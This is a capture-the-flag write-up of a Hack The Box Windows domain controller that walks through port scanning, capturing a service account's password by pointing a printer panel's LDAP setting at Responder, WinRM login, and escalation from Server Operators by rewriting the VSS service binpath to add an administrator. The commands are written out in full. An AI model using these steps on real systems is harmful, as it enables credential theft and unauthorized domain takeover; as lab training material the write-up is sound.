![image](https://github.com/user-attachments/assets/79791305-5bb3-4d09-baa5-8f15252c1a8a)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration:

I began the enumeration process by scanning for open ports and running services using a tool called `rustscan`. The scan revealed multiple open ports in the target environment:

```
rustscan -a 10.10.11.108 -- -A -T4 -vv -oN return_nmap
```
![image](https://github.com/user-attachments/assets/ef415c72-1bd4-4e9e-b5b2-3c3f6c40c026)

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-08-30 06:46:46Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Longhorn (91%), Microsoft Windows 10 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=8/30%OT=53%CT=%CU=36777%PV=Y%DS=2%DC=T%G=N%TM=66D166C2%P=x86_64-pc-linux-gnu)
SEQ(SP=F6%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
SEQ(SP=FC%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=246 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-30T06:47:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m35s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31931/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12652/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26260/udp): CLEAN (Timeout)
|   Check 4 (port 53844/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   225.02 ms 10.10.14.1
2   225.11 ms 10.10.11.108
```

From the port scan results, I identified a domain running on the target host: `return.local`. To facilitate further enumeration and exploitation, I added this domain to my host configuration file.

## Web enumeration:

On port 80, I observed an HTTP service running. Upon browsing to the web page, I discovered it was a printer admin panel.

![image](https://github.com/user-attachments/assets/7e079dfb-cf88-4103-8797-0852a4c2b6c0)

In the settings tab, I noticed another domain, `printer.return.local`, which I added to my host configuration file. Additionally, I identified a user named `svc-printer`.

![image](https://github.com/user-attachments/assets/475dc4df-a06c-4c55-b9b7-46d1274ddb37)

## Responder:

Since port 389 was open, indicating LDAP-based authentication, I started the responder on my local host to capture any credentials sent to it:

```
sudo responder -I tun0 -dwv
```

![image](https://github.com/user-attachments/assets/10084aae-cca7-4b60-9a0f-639ee80d0f5f)

I replaced the server address with my responder IP and clicked on update in the printer admin panel. Since the password was saved in the panel, I received the credentials in clear text on my responder.

![image](https://github.com/user-attachments/assets/788a5a8a-0c7d-4ec7-addb-a5cb30c7431d)

## SMB enumeration:

With the credentials obtained from the printer admin page, I proceeded to enumerate SMB shares and users within the network. Although there weren't any special file shares accessible to me, I found that the number of users in the environment was limited.

First, I checked for available shares using the credentials:

```
nxc smb return.local -u svc-printer -p '*******' --shares
```

![image](https://github.com/user-attachments/assets/324e100d-890f-42ad-bc4c-91ac54ca1f27)

Next, I enumerated users using the RID brute-forcing technique, but didn't worked either.

```
nxc smb return.local -u svc-printer -p '********' --rid
```

![image](https://github.com/user-attachments/assets/58355005-fd51-4755-ba92-7a44eb0c20aa)


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initial access:

After enumerating the SMB shares and users, I proceeded to check if the `svc-printer` user had WinRM access. I confirmed this by running the following command:

```
nxc winrm return.local -u svc-printer -p '********'
```

The command confirmed that the `svc-printer` user had access to WinRM. Therefore, I used the `evil-winrm` tool to log in with the obtained credentials:

![image](https://github.com/user-attachments/assets/5e6006b0-115b-45fe-b236-2a8deb119911)

Once logged in, I successfully fetched the user flag. 🙂

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Root.txt

After gaining initial access, I began investigating ways to escalate privileges. Upon checking my group memberships, I discovered that I belonged to a unique group called `Server Operators`. This group has significant control over certain services, allowing for the execution of arbitrary commands and potential privilege escalation.

![image](https://github.com/user-attachments/assets/1a24c4ab-6fc4-4067-b41d-a7bd1a0c8d57)

## Privilege Escalation via VSS Service:

I found multiple methods for privilege escalation related to the `Server Operators` group but decided to follow the method outlined in this [blog](https://web.archive.org/web/20240422094105/https://cube0x0.github.io/Pocing-Beyond-DA/). The blog demonstrated how to exploit the Volume Shadow Copy Service (VSS) to gain elevated privileges.

![image](https://github.com/user-attachments/assets/5e03bd33-8599-4d84-82a1-ea132ba84361)

Instead of using a reverse shell with Netcat, I chose to add the svc-printer user to the local Administrator group using the following commands:

```
sc.exe config VSS binpath="C:\Windows\System32\cmd.exe /c net localgroup Administrators svc-printer /add"

sc.exe stop VSS

sc.exe start VSS
```

![image](https://github.com/user-attachments/assets/a2d9655d-493b-46a8-8bf1-58c943d916ea)

After executing these commands, I confirmed that the svc-printer user was successfully added to the Administrator group:

![image](https://github.com/user-attachments/assets/692d9713-fd74-407d-ad5a-89d01f4cfaca)

I then logged out and back in, and I was able to retrieve the root flag from the Administrator's desktop. (pwn3d!🎉)

![image](https://github.com/user-attachments/assets/e0a445c1-ce9b-4151-a062-591183f0fe5c)
